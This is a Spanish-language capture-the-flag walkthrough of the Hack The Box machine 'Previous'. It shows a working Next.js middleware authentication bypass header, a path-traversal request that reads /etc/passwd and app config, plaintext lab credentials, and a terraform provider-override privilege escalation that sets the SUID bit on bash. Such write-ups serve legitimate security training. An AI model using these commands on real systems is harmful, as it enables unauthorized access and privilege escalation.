---
tags:
title: Previous - Easy (HTB)
permalink: /Previous-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash 
nmap -sCV -p22,80 10.129.242.162                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 15:33 -03
Nmap scan report for 10.129.242.162
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.86 seconds
```

Vemos que en el  puerto `80` corre el servicio `http` que nos redirige a una pagina 

```bash 
echo "10.10.11.83 previous.htb" | tee -a /etc/hosts
```

Agregamos el dominio al `/etc/hosts` para que la `ip` nos resuelva de manera correcta al dominio

## Website /  Port 80

Veo la siguiente pagina por el puerto `80`.

![{B3C979E5-18F5-4E02-AC2B-45EBB4F80633}](images/{B3C979E5-18F5-4E02-AC2B-45EBB4F80633}.png)

Si tocamos en cualquiera de los dos botones nos redirigue a un panel del login, del cual no nos podemos aprovechar debido a que no tenemos credenciales. 

![{0C82B64D-D69C-44BC-BB52-532359BCEE2B}](images/{0C82B64D-D69C-44BC-BB52-532359BCEE2B}.png)

Si vemos que tecnologías se utilizan en esta ocasión vemos que se emplea `NextJS` mas en concreto la versión `15.2.2`, que si nos vamos a Google y buscamos por dicha versión vemos que esta versión corre con `middleware`.
>`Middleware` es una funcion de NextJS que se ejecuta automaticamente en un bucle para cada solicitud entrante de una pagina la cual actua como intermediario para inspeccionar o cambiar la solicitud de respuesta, Permitiendo entre otras cosas implementar logicas como la autenticacion de los usurios.

Volviendo al tema, tiene una vulnerabilidad la cual nos permite Bypassear la autenticación del login enviando la cabecera `x-middleware-subrequest` este CVE tiene como ID `CVE-2025-29927`, si interceptamos la petición del botón de `Getting Started` por ejemplo, vemos que enviando la solicitud no recibimos nada y nos devuelve un código de esta `302`.

### Detecting LFI

![{61BCA220-9E23-4981-8507-9FE248823C97}](images/{61BCA220-9E23-4981-8507-9FE248823C97}.png)

```shell
dirsearch -u http://previous.htb/api -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'                   ⏎

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                
 (_||| _) (/_(_|| (_| )                                                                                                                         
                                                                                                                                                
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://previous.htb/

[20:16:22] Scanning: api/                                                                                                                       
[20:16:24] 308 -    22B - /api/%2e%2e//google.com  ->  /api/%2E%2E/google.com
[20:16:43] 400 -    64B - /api/auth/admin                                   
[20:16:43] 400 -    64B - /api/auth/adm
[20:16:43] 400 -    64B - /api/auth/login.asp
[20:16:43] 400 -    64B - /api/auth/login.php
[20:16:43] 400 -    64B - /api/auth/login
[20:16:43] 400 -    64B - /api/auth/login.aspx                              
[20:16:43] 400 -    64B - /api/auth/login.jsp
[20:16:43] 400 -    64B - /api/auth/login.htm
[20:16:43] 400 -    64B - /api/auth/logon
[20:16:43] 400 -    64B - /api/auth/login.html
[20:16:43] 302 -     0B - /api/auth/signin  ->  /signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000
[20:16:43] 308 -    28B - /api/axis2-web//HappyAxis.jsp  ->  /api/axis2-web/HappyAxis.jsp
[20:16:43] 308 -    23B - /api/axis//happyaxis.jsp  ->  /api/axis/happyaxis.jsp
[20:16:43] 308 -    34B - /api/axis2//axis2-web/HappyAxis.jsp  ->  /api/axis2/axis2-web/HappyAxis.jsp
[20:16:46] 308 -    56B - /api/Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /api/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[20:16:50] 400 -    28B - /api/download                                     
[20:16:51] 308 -    43B - /api/engine/classes/swfupload//swfupload.swf  ->  /api/engine/classes/swfupload/swfupload.swf
[20:16:51] 308 -    46B - /api/engine/classes/swfupload//swfupload_f9.swf  ->  /api/engine/classes/swfupload/swfupload_f9.swf
[20:16:52] 308 -    31B - /api/extjs/resources//charts.swf  ->  /api/extjs/resources/charts.swf
[20:16:55] 308 -    41B - /api/html/js/misc/swfupload//swfupload.swf  ->  /api/html/js/misc/swfupload/swfupload.swf
                                                                             
Task Completed  
```

Veo la ruta download en la `api` por lo que podriamos ver que parametro es el que funciona para pasarle un archivo a descargar.

```bash
ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fw 2 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=a
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 2
________________________________________________

example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 448ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

El parametro `example` podemos usarlo para pasarle un archivo a eleccion al parecer o al menos puedo intentar eso, pasandole el `/etc/passwd`.

```bash
 curl -s -X GET 'http://previous.htb/api/download?example=../../../../etc/passwd' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -H 'Cookie: next-auth.csrf-token=0cfc64cba7ac83fdebaa12d5d124c4aa9933b0787e94a09055694840cd152c72%7C77bd910322234e55aebf10c7f8bbd15c688a3837b3f12e39f7cdc6c693e3fb34; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs' | html2markdown
root:x:0:0:root:/root:/bin/sh bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

## Shell as jeremy

Como veo que tengo la capacidad de ver archivos de configuracion, o bien del sistema puedo apuntar a otros archivos, en concreto archivos de configuracion de `NextAuthJS`.

De todamas maneras sin esta via de deteccion de la vulnerabilidad, tambien lo detecte de la siguiente manera:

Una vez sabemos que en `/api` se hace referencia a archivos con extension `.js` si vemos por cada uno de estos endpoints cual es el contenido y que codigo tiene, vemos que en uno nos muestro mas endpoins de la pagina, mas en concreto : `/_next/static/qVDR2cKpRgqCslEh-llk9/_buildManifest.js`

{% raw %}
```bash
curl -s -X GET http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY/_buildManifest.js -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -H 'Cookie: next-auth.csrf-token=0cfc64cba7ac83fdebaa12d5d124c4aa9933b0787e94a09055694840cd152c72%7C77bd910322234e55aebf10c7f8bbd15c688a3837b3f12e39f7cdc6c693e3fb34; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs' | html2markdown 
self.__BUILD_MANIFEST=function(s,e,t,c,n){return{__rewrites:{afterFiles:[],beforeFiles:[],fallback:[]},__routerFilterStatic:{numItems:0,errorRate:1e-4,numBits:0,numHashes:n,bitArray:[]},__routerFilterDynamic:{numItems:s,errorRate:1e-4,numBits:s,numHashes:n,bitArray:[]},"/":["static/chunks/pages/index-a09f42904785092c.js"],"/_error":["static/chunks/pages/_error-41608b100cc61246.js"],"/docs":[e,t,"static/chunks/pages/docs-5f6acb8b3a59fb7f.js"],"/docs/components/layout":[e,t,"static/chunks/pages/docs/components/layout-79ce7edc85dbc179.js"],"/docs/components/sidebar":[e,"static/chunks/pages/docs/components/sidebar-0302befb549e0142.js"],"/docs/content/examples":["static/chunks/pages/docs/content/examples-e4a3a28759c69901.js"],"/docs/content/getting-
started":["static/chunks/pages/docs/content/getting-
started-7dd61d428f6ada5c.js"],"/docs/[section]":[e,t,"static/chunks/pages/docs/[section]-31d8b831c1e60f26.js"],"/signin":[t,"static/chunks/pages/signin-d0284ed11872b445.js"],sortedPages:["/","/_app","/_error","/docs","/docs/components/layout","/docs/components/sidebar","/docs/content/examples","/docs/content/getting-
started","/docs/[section]","/signin"]}}(0,"static/chunks/8-fd0c493a642e766e.js","static/chunks/0-c54fcec2d27b858d.js",1e-4,NaN),self.__BUILD_MANIFEST_CB&&self.;__BUILD_MANIFEST_CB();
```
{% endraw %}

Podemos ver uno que nos llama la atencion que es `docs/content/examples` que si lo enumeramos vemos lo siguiente.

```bash
curl -s -X GET 'http://previous.htb/docs/content/examples' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -H 'Cookie: next-auth.csrf-token=0cfc64cba7ac83fdebaa12d5d124c4aa9933b0787e94a09055694840cd152c72%7C77bd910322234e55aebf10c7f8bbd15c688a3837b3f12e39f7cdc6c693e3fb34; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs' | html2markdown
# Hello World

    
    
    import { app } from 'previous';
    
    const app = new App();
    app.start();
    

Download the full example [here](/api/download?example=hello-world.ts)!
```

Vemos que hace referencia a un endpoint de descarga (`/api/download?example=archivo`), mediante el parametro `example` podemos intentar hacer un `Path Traversal` y derivarlo a un `Local File Inclusion(LFI)`.
Ahora procedemos a buscar en la documentacion de `NextJsAuth` que es lo que se emplea en este caso, que existe una ruta con un archivo el cual entre otras cosas puede contener credenciales en texto plano o JWT que nos permitan abusar de los mismos y ganar acceso a la maquina. Dicha ruta reside en `/.next/server/pages/api/auth/[...nextauth].js`

![{46156B4A-66D3-4989-A495-5904CAA51B60}](images/{46156B4A-66D3-4989-A495-5904CAA51B60}.png)

Vemos las credenciales de usuario `Jeremy` con su password `MyNameIsJeremyAndILovePancakes`
Nos logueamos via `SSH` 

```bash 
ssh jeremy@previous.htb
The authenticity of host 'previous.htb (10.129.242.162)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'previous.htb' (ED25519) to the list of known hosts.
jeremy@previous.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

	 [..snip..]

Last login: Tue Nov 11 00:07:08 2025 from 10.10.17.19
jeremy@previous:~$
```

Y ya podemos visualizar la flag del user de bajos privilegios.

```bash
jeremy@previous:~$ cat user.txt 
9f3bb9dfca537db7fbfaf9dbcc5fc216
```

## Shell as root 

Enumerando y viendo sobre que tenemos privilegios a nivel de `SUDOERS`

```bash 
sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Vemos que podemos usar `terraform` como el usuario `root` pero sobre los archivos que estan en el directorio `/opt/examples` al ver que archivos hay ahi.

```bash 
-bash-5.1$ cat main.tf 
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

Y tambien.

```bash 
cat terraform.tfstate
{
  "version": 4,
  "terraform_version": "1.11.4",
  "serial": 8,
  "lineage": "44b13e76-4b23-5fd1-8bf6-b5625394edda",
  "outputs": {
    "destination_path": {
      "value": "/home/jeremy/docker/previous/public/examples/hello-world.ts",
      "type": "string"
    }
  },
  "resources": [
    {
      "mode": "managed",
      "type": "examples_example",
      "name": "example",
      "provider": "provider[\"previous.htb/terraform/examples\"]",
      "instances": [
        {
          "schema_version": 0,
          "attributes": {
            "destination_path": "/home/jeremy/docker/previous/public/examples/hello-world.ts",
            "id": "/home/jeremy/docker/previous/public/examples/hello-world.ts",
            "source_path": "/root/examples/hello-world.ts"
          },
          "sensitive_attributes": []
        }
      ]
    }
  ],
  "check_results": [
    {
      "object_kind": "var",
      "config_addr": "var.source_path",
      "status": "pass",
      "objects": [
        {
          "object_addr": "var.source_path",
          "status": "pass"
        }
      ]
    }
  ]
}
```

Vemos que al usar el privilegio que se habla de `Provider development overrides are in effect` o que nos da entender que podemos crear nuestro `Provider Installation override` por ende vamos a la [pagina](https://developer.hashicorp.com/terraform/cli/config/config-file) oficial para ver como se ve un archivo para dicha tarea.

Lo ajustamos a nuestra ocasión y quedaría así: 

```bash 
provider_installation {

  # Use /home/developer/tmp/terraform-null as an overridden package directory
  # for the hashicorp/null provider. This disables the version and checksum
  # verifications for this provider and forces Terraform to look for the
  # null provider plugin in the given directory.
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }

  # For all other providers, install them directly from their origin provider
  # registries as normal. If you omit this, Terraform will _only_ use
  # the dev_overrides block, and so no other providers will be available.
  direct {}
}
```

Y exportamos la variable del archivo 

```bash 
export TF_CLI_CONFIG_FILE=/tmp/dev.tfrc
```

Y veremos que al ejecutar `sudo /usr/bin/terraform -chdir\=/opt/examples apply` nos da este error.

```bash 
sudo /usr/bin/terraform -chdir\=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to instantiate
│ provider "previous.htb/terraform/examples" to obtain schema: could not find executable file starting with terraform-provider-examples..
```

El cual nos dice que el archivo ejecutable de nombre `terraform-provider-example` no existe, por ende lo creamos para abusar de que dicho archivo se va a ejecutar y le metemos algun comando, com por ejemplo asignarle el bit `SUID` a la bash, 

```bash 
#!/bin/bash 
chmod u+s /bin/bash
```

Le damos permisos de ejecucion 

```bash 
chmod +x terraform-provider-example
```

Chequeamos el permiso de la bash 

```bash 
ls -la /bin/bash
-rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Y volvemos a ejecutar el comando :`sudo /usr/bin/terraform -chdir\=/opt/examples apply`

```bash 
sudo /usr/bin/terraform -chdir\=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to instantiate
│ provider "previous.htb/terraform/examples" to obtain schema: Unrecognized remote plugin message: 
│ Failed to read any lines from plugin's stdout
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /tmp/terraform-provider-examples
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│ ..
```

Y vemos que se ejecuta correctamente, chequeamos que se haya asignado el bit `SUID`a la bash 

```bash 
ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Y vemos que si, asi que ahora nos queda convertir nuestra shell a una shell de `root` 

```bash 
bash -p
```

```bash 
bash-5.1# whoami 
root
```

`~Happy Hacking.`
